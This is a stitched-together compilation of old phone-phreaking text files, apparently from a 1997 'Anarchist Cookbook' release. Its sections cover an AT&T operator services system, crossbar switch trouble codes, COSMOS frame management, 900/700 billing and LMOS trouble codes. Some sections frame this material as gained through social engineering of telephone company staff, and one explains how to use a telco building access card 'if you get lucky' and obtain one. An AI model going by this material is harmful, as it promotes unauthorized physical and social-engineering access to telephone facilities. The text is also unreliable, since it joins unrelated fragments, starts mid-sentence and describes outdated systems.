 No more of the "hey dude!! call me back I'm out of codes!!!)  
     The VDT's keyboard looks pretty good.  Has 117 keys, this includes a
little dialing pad, to the left of the keyboard where the IBM function keys
usually are, are keys like hold, 'MUTE', 'SPLIT ON', 'VOL UP', and 'VOL DOWN'. 
Also I can make out some keys like 'Cancel Call' and 'Make busy'. The keyboard
is lightweight and detachable, this lets the operators position it easily to a
comfortable position.  The keyboard has tactile feedback, keys are logical
grouped, and the most frequently used ones are larger than the rest.  Customers
can program macro-keys that will initiate a sequence of key strokes with only
one key.  These are located near the top of the keyboard and have no writing on
them.  
     The VDT conveys call-status information and enables operators to follow
the progression of calls.  The terminal has a large, high-resolution display to
increase readability, a glare-free, positive video screen (dark characters on
light background), and a type font that is easy to read.  A screen refresh
rate, well above current norms, prevents flicker.  In addition, several
controller capabilities further clarify call information (multiple character
sets, reverse video, underlining), and are used in a consistent manner to draw
the operator's attention to particular types fo call-handling information.
     To minimize movement of the operator's eyes and head, the most critical
information about a call is displayed at the bottom of the screen.  The display
shown during a calll relays only the information needed to handle that call. 
To a avoid distraction, information may be held by the system and not
displayed.  Fields can be edited locally to reduce time required to correct
operator keying errors.
     Now im going to make a pretty pitiful attempt at showing you the screen
how it appears in a picture I have of it.

    The ":)" are faces. Yes they see faces on the screen and ~~ is a picture of
a phone. And ~` is a picture of a phone off the hook. Didn't I tell you the
picture of the operators terminal was going to be pitiful?   

Intelligent Communication Workstation
     The intelligent communication workstation is for the international market.
 It has all the functions of the VDT but uses a personal computer with a color
display.  This adds flexibility to meet the requirements of different countries
and includes software to assist operators in handling otherf languages.  A
chinese version of the system, for example, allows the operator to enter names
using Chinese characters for entry into billing records.  Future releases will
make this a combined services terminal which can be used for both toll and
assistance and directory assistance.

Basic-Services Terminal  
     The basic services terminal (BST) is for directory assistance.  It has a
20-character display rather than a cathode-ray tube display.  Dedicated
function keys allow easy access to conference, transfer, and emergency
functions.  The BST has the same voice features as the VDT.  The display,
keyvoard arrangement, and call-handling keying sequences minimize operator
call-handling.

APPLICATIONS

     The OSPS offers services and features for North American and international
directory assistance, and toll and assistance.  Capacity depends on the
application and the features required.  System capacities for North American
applications are shown in the panel below:

Service                   Current           Next System Release
Directory Assistance        
Calls/hour                90,000            160,000
Operator positions        512               1000
----------------------------------------------------------------
Toll and Assistance
Calls/hour                68,000            100,000
Operator positions        512               700
----------------------------------------------------------------
For these applications, call handling capacity is now 68,000 calls an hour for
toll and assistance and 90,000 calls an hour for difectory assistance.  While
these high capacities stem from the distributed architecture fo the 5ESS
switch, its modular design allow the OSPS to grow incrementally depending on
customer needs.
     Continuing architectural and design and hardware improvements will lead to
even higher capacities.  The next system relase, for example, will increase
toll and assistance to 100,000 calls an hour and directory assistance to
160,000 calls an hour.

Directory Assistance
     With directory assistance a caller gives a name and address and an
operator or the system responds with a phone number.  With vendor computer
systems, OSPS uses an internal audio response unit to "speak" the number to the
caller.  Future releases will permit adding or changing announcements by
interfacing with external audio response units.  Future releases also will
enable the operator to connect the person requesting the number and apply
billing in response to the caller's requests.  This provides a telephone
company with signigicant new revenue opportunities.  OSPS directory assistance
allows conferences between operators and hand=off of the call to another
operator.  Incoming directory assistance calls can be rerouted to operators on
a second OSPS.

Toll and Assistance    
     These operator services help callers complete toll calls, bill the call to
calling cards or to a third party,  bill the call person-to-person, and give
general help.  OSPS uses ISDN to furnish some of these services.  For example,
the system gives operators access to customer-supplied database computers. 
These computers may contain frequently referenced data such as emergency
numbers or rate and route information.  Operators are looged onto the database
automatically and single key actions transfer data from the data base screen to
the call handling screen.

International Applications
     Features start with a subset of the ACD, derectory assistance and basic
toll and assistance operator call handling features as in the North American
version.  Specific international needs are addes such as real-time billing
information, completed call retrieval, call booking, and a visible instruction
table.
     Real-time billing information for international calls includes validation
of credit-card numbers or billing number, computing charges in real time and
storing them in completed call records.  The billing information can be
supplied to the customer by a synthesized announcement of time and charges or
direct operator quotation.
     Completed call retrieval aallows the operator to retrieve the record of a
completed call, including call charges in response to customer inquiry.  It
also allows the operator to give correct billing in the case of a call being
cut off and reconnected.
     Call booking is for customers wanting calls placed at a particular time
and to allow operators to store calls for later completion during less
congested periods.  Data for these calls is stored in the OSPS and may be
distributed to operators for setup as soon as possible or at a designated time.
 Operators also may request retrieval of previously booked calls.  
     The operator uses a visible instruction table to obtain special dialing
instructions or otherf call-handling material.  The text is stored in the 5ESS
switch as a series of pages, and is displayed in a window area on the VDT
screen.  
     Additional features include customer and operator fraud protection,
enhanced charge and duration advice and language assistance, depending on the
needs of the particular country.  OSPS also supports the major international
signaling systems.


NEXT GENERATION

     The OSPS represents a new generation in operator services based on ISDN. 
The system can be configured to serve any operator application requiring access
to data bases and automated call distribution to operators. Since it is a
application on the 5ESS switch, it allows operator services to be provided at
local, tandem, or toll switching centers.  
     The design enables operators to be hundreds of miles from the switch. 
Features reduce a phone company's costs in the areas of operator expense,
administration and maaintenance, and network design.  The OSPS includes many
operator services not previously available and permits a wide mix of
applications on a single switch.

Introduction:
-------------  
This guide was developed by the Plant Training Center,
to provide a ready reference of information that  can be used by The Central
Office Switchman during the performance of his daily work.   


Preface:
--------
In this part Class "A" reports are only covered. Future issues will have
MTF Tests/Class C/Alarms/Trouble Recorder etc.

Section #1 - Class "A" Reports        
------------------------------ 
     
CLASS "A" Reports
-----------------
Class "A" troubles are those reported by subcribers. Prompt and complete
handling is very important. Propmtness because the subcribers service may be
affected and completeness so that the customers service is not impaired  a 
second time for the same reason. 

If the line is held out of service by euipment note the x-points closed and
release the line hold magnet to allow the subcribers service. If necessary a
channel plug may be inserted in the junctor switch portion of the linkage in
order to release the subcriber's line sooner. The remaining linkage will be 
help up. So therefore what is done in such problems is to actually trace 
this held path and analyze to determine why it was held up. To keep Class "A"
report to a minimum switchman analyze all trouble recorder cards as soon as
they come in and mark each card for missing or false punches and compare with
previous cards. In this way repeaters can be spotted quickly and acted upon.
Usually switchman activate the continuity and ground test circuit of the
markers at regular  intervals in order to pick up linkage tip and ring 
troubles. Using this approach, along with regular testing procedures should
keep common euipment troubles to a minimum.

Here is a list of Class "A" trouble reports:

NDT - No Dial Tone    
CC - Cant call
DCLR - Double Connection-Lift Receiver
PS - Permanent Signal
COO - Cutoff Outgoing
DCO - Double Connection Outgoing
CBDT - Cant Break Dial Tone
DTWD - Dial Tone While Dialing
DCWD - Double Connection While Dialing
NAR - No Audible Ring
GWN or INTC  - Gets Wrong Number of Intercept
ATB - All Trunks Busy
DA - Dont Answer
GB-FB - Gets Busy-False Busy
CH - Cant Hear
CBH Cant Be Heard
NSY - Noisy 
DTRWT - Dial Tone Returns While Talking
XT - Cross Talk
COL Clicks On Line
BDR - Cell Doesn't Ring
DGC - Dont Get Calls
RI - Reaches Intercept
FRI Fails  to Reach Intercept
CIE - Called in Error
FB - False Busy
BRCM - Bell Rings - Cant Meet 
DCI - Double Connection Incoming  
CT - Cant Trip Ringing
COI - Cut OFf Incoming
FDA - False Dont Answer

Well this article will conclude on future issues. Hopefully now you have a 
better understanding of all kinds of troubles reported to the Xbar office.
This article is a little complicated to follow and DOES require the basic 
understanding of No. 5 Crossbar Switching System. 

Would also like say thanks to Lord Micro and Seeker who were the people behind
the bins at a local office.

|        SSWC - Bell Research Report (Vol III)           |
|--------------------------------------------------------|
|        Phile #10 of P/HUN Magazine Issue #5            |
+--------------------------------------------------------+

         All research gathered, tested and mastered by the original 
         members of SSWC: 
 
         Chance - The Technician - Cellular Phantom 
 
         After the large response we have received after writing our 
         first two Bell Research report documents, we have chosen to 
         continue our discussions on the ever intriguing Bell System 
         and its many fascinating departments. Note that the 
         information in this file is subject to change. However, we 
         will try to keep you updated as much as possible. 
 
 
    In our in depth research and social engineering practices of the 
 Bell System, we have discovered an important plan which frameworkers 
 and switch technicians must follow. This plan is known as the Frame 
 Force Management Plan (FFMP), which is a guide to obtain maximum 
 benift from the performance of frameworkers. (In other words this  
 plan is used so the Bell System can make sure there frameworkers 
 don't drop the ball). This plan may be used in either a centralized 
 frame environment or a local a local wire center. It provides  
 techniques for the manager to use in estimating the work load (demand 
 and programmable frame work) and matching the available frame 
 personnel to the expected work. The plan also provides information 
 for the manager to analyze and evaluate the results of these 
 techniques. In essence, the plan aids supervision in ensuring that: 
 
   * Work is available to ensure adequate load exists for the 
     available time. 
 
   * Adequte personnel is available to complete necessary work. 
 
   * Work is assigned in a correct sequence to minimize impact on 
     other personnel. 
 
   * Completed work is evaluated to ensure its efficiency and quality. 
  
   * Work and personnel are scheduled to meet due date commitments. 
 
 
     Note: The records, reports and status information for this plan 
           may be administered in the local distributing frame  
           enviornment, a Frame Control Center (FCC) or a Frame Work 
           Station (FWS) in a Switching Control Center (SCC). 
 
 
    This plan provides frame managers with suggested procedures to  
 develope forcasts or estimates of future work volumes. With this 
 knowledge, the manager should be able to accomplish the following: 
 
 
 
   * Meet subscriber demands. 
  
   * Program company-generated work. 
 
   * Ensure that all employees are assigned productively. 
 
     
   To avoid possbile misunderstanding, the following definitions are 
   provided. 
 
 
 Distributing Frame:    Main Distributing Frame (MDF), Intermediate  
                        Distributing Frame (IDF), Line Distributing 
                        Frame (LDF), Trunk Distributing Frame (TDF), 
                        No. Group, Translator, Block Relay,  
                        No. Network (Automatic Number Identification) 
                        [ANI] and any other frame performaing 
                        functions related to work covered by this 
                        plan. 
 
 Frame Control Center:  An administrative center that performs 
                        pricing, packaging, force loading, tracking, 
                        and force administration for centralized 
                        frame operations. 
 
 Frame Work Station:    A work station that is responsible for the 
                        functions of the FCC on a smaller scale. It 
                        is located in an SCC. 
 
 Programmable Work:     Programmable work requests consist of the same 
                        work requests that are included in demand 
                        work. The difference is that the programmable 
                        work requests are received before the due date 
                        in time to schedule thier completion. Examples 
                        of programmable work are: 
  
                            * Service Orders 
                            * Trunk Orders 
                            * Special Service Orders 
                            * Verifications 
                            * Cable Transfers 
                            * Routine maintenance 
                            * Line Equiptment Transfers 
                            * Service Observing (Remote 
                              Observation[REMOB]) 
 
        
    In a Cosmos environment, the following activites should be 
    conducted to ensure data base accuracy: 
 
    * Prompt and accurate frame service order completion 
      notifications. 
 
 
 
    * Use of the order status procedures for notifying the Loop 
      Assignment Center (LAC) and other control centers of 
      discrepancies and pending order status encountered that 
      contradict the Cosmos frame work order or prevent frame 
      order completing. 
 
 
    The average service order for an MDF consists of two basic 
 operations: (1) the jumper on the Main Distributing Frame (MDF), 
 and (2) the cross-connections for the telephone number, billing, 
 and line equipment. (Modular and Common System Main Interconnecting 
 Frame [COSMIC]) systems' types of cross-connects. COSMIC; developed 
 by AT&T.  
 
 
     Next we will discuss how Cosmos is used in aiding Frameworkers 
     and Frame Technicians. 
 
     The Computer System for Main Frame Operations (COSMOS) is a 
 mechanized record and assignment system designed to maintain 
 accurate records of Main Distributing Frame (MDF) facilities and 
 efficiently administer desired assignment of exchange facilities.  
 Cosmos maintains a record of all line equiptment, exchange cable 
 pairs, and telephone numbers served by the wire center. 
  
    Cosmos is a very useful tool in administering frame work in a 
 central office. It allows increased productivity and gives the 
 frame supervisor much greater visibility of the projected work  
 load. However, Cosmos will not automatically create order out of 
 chaos. 
 
    The purpose of Cosmos is to assign the shortest possible MDF 
 jumper connection between CO line equiptment and the cable pair 
 serving the customer. 
 
    With the Dedicated Inside Plant (DIP) administration, Cosmos aids 
 in reusing as many spare jumpers as possible. When a D-Order (dis- 
 connect order) is processed, the possibility of reusing the existing 
 jumper on a new connect service order is considered. Re-using a 
 jumper eliminates extra work and reduces the possibility of wiring 
 errors. 
 
    Frame work is performed from the Cosmos output whether the order 
 is a service order or work order. When a service order cannot be  
 worked, the frame workers should establish a jepordy report in  
 Cosmos. Enough information must be provided so that the LAC can 
 take appropriate action, without having to call the frame. 
 
    Because Cosmos will only print out orders due on the date 
 requested, and because an inquiry can be made on any pending orders 
 in Cosmos by order number, it is not necessary to file orders 
 by due date or by order number. However, it is necessary to be able 
  
 to find orders that have been modified, cancelled, or changed. 
 
    Next we will briefly discuss the Cosmos orders filing system, 
 which can be divided into two parts: (1) pending orders, and 
 (2) Main Distributing Frame (MDF) completed orders. In each section 
 the orders will be filed by exchange code. Circuits without a 
 telephone number are filed in a separate "private line bin" 
 *(however, we regret that we have not fully understood and research 
 this section of the filing system, due to its uncommon use). The 
 service orders in the pending section are those which for one  
 reason or another, cannot be worked at present. These include orders 
 that have had the due dates advanced or that require the installers 
 go-ahead. A separate file area is kept for orders in jepordy.  
 When an order is MDF-complete, it is placed in the complete order 
 section. Work orders such as (cable pairs transfers, line equiptment 
 transfers) should be filed in the pending order section by order  
 number. In the completed section, work orders should be filed 
 by telephone exchange and remaining telephone number, along with 
 service orders. Orders in the complete section are only retained 
 for a few weeks only. Usually after a two week period those  
 completed orders are removed.  
 
 
    The responsibility of the frame with Cosmos is to enter the  
 status of all work orders into the system. The frame also shares 
 the responibility for reporting data base validity, and is  
 responsible for reporting any data base errors to the originator 
 of the order as well as performing periodic verifications of the 
 data base, to insure proper functioning of the data base. 
 
    We will now briefly discuss the Cosmos Frame Work Management (FWM) 
 module. The Cosmos FWM supports a Frame Control Center (FCC), a  
 Switching Control Center (SCC), or a traditional wire center location 
 by mechanizing the clerical effort involved in sorting, pricing, and 
 packaging Plain Old Telephone Service (POTS) frame work orders. The 
 module automatically developes work packages, either by due date,  
 order type, frame location, switching type or in any combination 
 which meets assignment requirements.

                        CARRIER 900/700 SERVICE
                    
                          WRITTEN BY TONE TEC

          On November 30,  1988,  the FCC approved a tariff which makes
          900/700 Services available to all Carriers.   Prior to  this,
          only  AT&T  provided information services thru  900  numbers. 
          The 900/700 service offers enhanced information  capabilities
          such as
             * interactive group conversations
             *  recordings  for weather status,  sports  scores,  music
          news,etc.

          The  900/700  Service differs from the 976  product  in  that
          900/700  Services  are carried interLATA  and  interstate  as
          opposed to intraLATA (LATA in telco lingo means Local  Access
          Transport Area).  Also the Carrier offers the Service to  the
          Information  Provider(IP)  who is  considered  the  Carrier's
          customer.  This differs from 976 Service where the IP is  the
          local telco's customer.

          But what does all this mean to you,  John Phrack?  Why,  more
          confusion,  of  course,  as  to just  who  is  handling  your
          billing.  Detail  for  900/700 messages will  appear  on  the
          appropriate Carrier toll page of your bill.  Messages will be
          interspersed  with other LD calls placed thru  same  carrier.
          The cost varies from 50 cents per minute to 2.00.

          The  method used for reaching a 900 or 700  service  differs.
          Calls  to  900  numbers may always be  completed  by  dialing
          1+900+NNX+XXXX  (NXX being the Exchange or C.O.  code).  Each
          900 NNX is carrier specific and customers will not always  be
          aware of which carrier is providing the service.  Example:  A
          customer  with  AT&T as the chosen 1+ carrier could  dial  an
          advertised  900# provided by Allnet.   Since the service  was
          reached  without dialing Allnet's access code,  the  customer
          may expect the call to appear under AT&T's charges.  WRONGO!

          Calls to 700 numbers are completed by dialing  1+700+NNX+XXXX
          or  10XXX+1+700+NNX+XXXX depending on the  customers  primary
          carrier.  Each  700 NNX is not  Carrier  specific,  therefore
          customers will be aware of which Carrier is providing the 700
          Service.  Advertisements  for 700 Services will  appear  with
          appropriate  5-digit Carrier code.  Allnet Communications  is
          the  first  carrier  to process  700  Service  messages.  The
          content  of the 700 Service may be a recorded  message,  live
          convo,  or  prompts  to enter responses thru the  use  of  TT
          keypad.  "Live Convo"  programs won't be monitored  by  local
          telco, but will be monitored 24 hours a day, 7 days a week by
          Allnet. (Are you kidding?)

          By the way, if you choose to abuse this service from home (or
          your  best bud's home) there is a nifty device  available  to
          the Carrier call Selective Carrier Denial (SCD).  This is  an
          optional  restriction  service available to  the  carrier  to
          restrict  the  end  user from  accessing  their  network  via
          1+,0+,00- and 10XXX dialing.  This does not affect access  to
          the local network. SCD is only designed to restrict customers
          with One-Party service.

          Surely    there   exists   some   exciting   new    phreaking
          potentialities out of all this.............................

Incase one of these days you get lucky 
and get a Telco Card Key, heres how you
can use it -> :                               

HOW TO USE 'YOUR' COMMAND CARD KEY  
::::::::::::::::::::::::::::::::::

An ENTER and EXIT sensor is installed at
the from entrance door.

A personal "Command Key" has been given
to you which is recognized as a valid
entry/exit to the building.

Each card is programmer for a specific 
tour and/or time schedule.Thirty minutes
on either side of the scheduled time 
allows for early entry or delayed
departure. 

Your key card must be used when entering
and exiting building.
 - If not used when exiting the building 
   , it will not unlock the next time it
   is  used to gain entrance and 
   vice-versa.

Present your card key to within 2 or 3 
inches of the ENTER/EXIT sensor. It is
not necessary to rub care key on the 
door glass.

If the card key is authorized for that
door for that time, within several 
seconds, you will hear the electric 
strike unlock.

Access/Egress by significant numbers of
personnel at the same time: For eg:
(This is just for info purposes) several
employees going to lunch. This procedure
will only be  in effect at specific
buildings with large number of employees
(for example Switching Control Centers).

- Local management will have to modify 
  system for specific times.
 
- First employees presents card which
  opens door.

- Following employees will also present
  thier card key  to the ENTER/EXIT 
  sensor in order to be acknowledged by
  the system program.

- A red indicator light installed in the
  ENTER/EXIT sensor enclosure will flash
  on to acknowledge your card key code
  has been recognized.

13) Re: STOP/START CLOCK

    Stop clock is to be used on all trouble which we intend to Dispatch
    to the customer but cannot do so because access is not available to 
    customer premises - this applies not only on Nassau and Suffolk troubles
    but on referred out troubles (Bklyn, Qns, Bronx, etc.) as well. The  
    narrative must provide information to justify the use of Stop clock.
    The work performance code Zero is THE ONLY code to be used after an eight
    (stop) and before a nice (start). Any other code will cancel the stop 
    clock. Stop and Start clock codes can be used a maximum of three times on
    one trouble report.

        The following Codes indicate a Stop/Start Clock.

        8 - STO - 121 = Stop Clock
        9 - STA - 122 = Start Clock

14) Re: Delayed Maintenance

    Delayed Maintenance is to be used when the customer has a Ckt out of
    service but still has communication with same location by use of an   
    alternate service. Alternate service can be Dial back up or another
    Ckt. going to the same location. Delayed Maintenance can be used  from 
    5:00PM friday through 8:00AM Monday. The codes used in LMOSare the same
    as for Stop/Start Clock. The difference is the narrative must indicate
    the alternate service the customer has.

                 Example #1 - Customer has D.B.H
                 Example #2 - Customer Has Ckt # _________ to same location.

    We must ask the customer if he has alternate service on all troubles
    "carried" overnight. The customer is entitled to a rebate for the entire
    duration of his trouble if it is over 24 hrs  on Data troubles and all
    occ orders specify (CCA) Customer Credit Allowance. We are responsible
    to give the customer the proper credit to which they are entitled.

        Well that about wrap's it up for this version of the Anarchist
Cookbook. I once again would like to thank all the people who have helped
me with either contributions or with a little critizisum. This has all 
taken about a year to finish, but now that the hard part is over updates
won't be near as hard. This is being released on June 13th, 1997. An 
Approperate date I believe, And I will try to have updates about every 
six momth or so. So until the next release remember,...
